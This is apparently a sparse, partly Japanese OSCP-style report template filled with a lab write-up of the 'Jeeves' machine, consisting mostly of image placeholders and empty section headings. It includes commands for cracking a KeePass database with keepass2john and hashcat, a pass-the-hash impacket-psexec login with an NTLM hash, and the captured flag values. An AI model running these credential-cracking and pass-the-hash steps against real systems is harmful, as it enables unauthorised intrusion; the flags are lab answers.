![[Jeeves image 1.png]]

OSCP Penetration Test Report

v.2.0

student@youremailaddress.com

OSID: XXXXX

![[Jeeves image.png]]

Copyright © 2023 OffSec Ltd. All rights reserved.

この出版物のいかなる部分も、その全部または一部を複製、コピー、譲渡、または著作権所有者に留保するその他の権利(コピーおよびその他すべてのコピー、ネットワークまたはその他の通信手段を使用した転送または送信、遠隔学習のための放送を含む)を、情報ストレージなどのいかなる形式または手段によっても、 OffSecからの事前の書面による許可なしに、送信または検索システム。

[1. OffSec OSCP Exam Penetration Test Report    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_gjdgxs)

[1.1 Introduction    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_30j0zll)

[1.2 Objective    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1fob9te)

[1.3 Requirements    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3znysh7)

[2. High-Level Summary    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2et92p0)

[2.1 Recommendations    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_tyjcwt)

[3. Methodologies    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3dy6vkm)

[3.1 Information Gathering    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1t3h5sf)

[3.2 Service Enumeration    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_4d34og8)

[3.3 Penetration    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2s8eyo1)

[3.4 Maintaining Access    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_17dp8vu)

[3.5 House Cleaning    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3rdcrjn)

[4. Independent Challenges    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_26in1rg)

[4.1 Target #1 – 192.168.232.55    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_lnxbz9)

[4.1.1 Service Enumeration    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_35nkun2)

[4.1.2 Initial Access – Anonymous SMB share leads to Wordpress RCE    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1ksv4uv)

[5. Active Directory Set    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_44sinio)

[5.1 Ajla – 10.4.4.10    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2jxsxqh)

[5.1.1 Initial Access – Password Brute-Forcing    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_z337ya)

[5.1.2 Privilege Escalation – Sudo group    22](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3j2qqm3)

[5.1.3 Post-Exploitation    22](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1y810tw)

[5.2 Poultry – 10.5.5.20    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_4i7ojhp)

[5.2.1 Initial Access – RDP login    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2xcytpi)

[5.2.2 Post-Exploitation    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1ci93xb)

[5.3 DC – 10.5.5.30    25](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2bn6wsx)

[5.3.1 Initial Access – Remote Commands Execution    25](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_qsh70q)

[5.3.2 Post-Exploitation    26](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1pxezwc)

1\. OffSec OSCP 試験ペネトレーション テスト レポート

1.1 はじめに

1.2 目的

1.3 必要条件

2\. ハイレベルなまとめ

3\. メソドロジー

3.1 情報収集

試験ネットワーク:

3.2 サービスの列挙

3.3 浸透

3.4 アクセスの維持

4\. 自主的な課題

4.1ターゲット#1–

4.1.1 初期アクセス –

4.1.2 サービス列挙

![[Jeeves image 2.png]]

![[Jeeves image 3.png]]

![[Jeeves image 4.png]]

ポート スキャン結果

| **IP Address** | **Ports Open** |
| --- | --- |
|  | **TCP**: 80,135,445 |

http

![[Jeeves image 5.png]]

![[Jeeves image 6.png]]

![[Jeeves image 7.png]]

Nothing

![[Jeeves image 8.png]]

![[Jeeves image 9.png]]

![[Jeeves image 10.png]]

![[Jeeves image 11.png]]

Jenkins ver 2.87

![[Jeeves image 12.png]]

4.1.2 初期アクセス –

![[Jeeves image 13.png]]

![[Jeeves image 14.png]]

![[Jeeves image 15.png]]

Local.txt値:e3232272596fb47950d59c4cf1e7066a

4.1.3 特権エスカレーション -

┌──(root㉿kali)-\[/home/kali/Downloads\]

└─# keepass2john CEH.kdbx

CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48

┌──(root㉿kali)-\[/home/kali/Downloads\]

└─# keepass2john CEH.kdbx > CEH.kdbx.hash

┌──(root㉿kali)-\[/home/kali/Downloads\]

└─# hashcat ./CEH.kdbx.hash /usr/share/wordlists/rockyou.txt --user -m 13400

![[Jeeves image 16.png]]

![[Jeeves image 17.png]]

kpcli --kdb CEH.kdbx

![[Jeeves image 18.png]]

![[Jeeves image 19.png]]

![[Jeeves image 20.png]]

![[Jeeves image 21.png]]

![[Jeeves image 22.png]]

![[Jeeves image 23.png]]

miss

impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@jeeves.htb cmd.exe

![[Jeeves image 24.png]]

4.1.4 エクスプロイト後の処理

dir /R

more \< hm.txt:root.txt:$DATA

![[Jeeves image 25.png]]

Proof.txt値:afbc5bd4b615a60648cec41c6ac92530

- **5. Active Directory Set**

ポート スキャン結果

| **IP Address** | **Ports Open** |
| --- | --- |
|  | **TCP:** |
|  | **TCP:** |
|  | **TCP:** |

5.1 アジュラ – 10.4.4.10

5.1.1 初期アクセス –

5.1.2 特権エスカレーション –

重大度: クリティカル

- **5.1.3 Post-Exploitation**

Screenshot of System Proof:

- **5.2 Poultry – 10.5.5.20**
- 5.2.1 初期アクセス –
- **5.2.2 Post-Exploitation**

**Local Proof Screenshot:**

**5.3 DC – 10.5.5.30**

5.3.1 初期アクセス –

- **5.3.2 Post-Exploitation**

**System Proof Screenshot:**